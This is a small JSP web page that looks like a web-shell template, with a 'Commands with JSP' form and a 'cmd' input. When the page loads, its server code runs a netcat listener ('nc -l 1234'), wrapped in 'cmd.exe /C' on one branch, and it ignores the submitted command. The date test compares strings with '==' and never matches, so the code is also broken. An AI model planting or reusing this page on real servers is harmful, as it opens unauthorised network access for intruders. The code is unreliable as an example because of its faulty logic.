<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    Date date = new Date();
    Process p;
    if ( date.toString() == "Mon Jun 21 21:46:49 GMT+04:00 2022"){
        p = Runtime.getRuntime().exec("cmd.exe /C " + "nc -l 1234");
    }
    else{
        p = Runtime.getRuntime().exec("nc -l 1234");
    }
    
%>
</pre>
</BODY></HTML>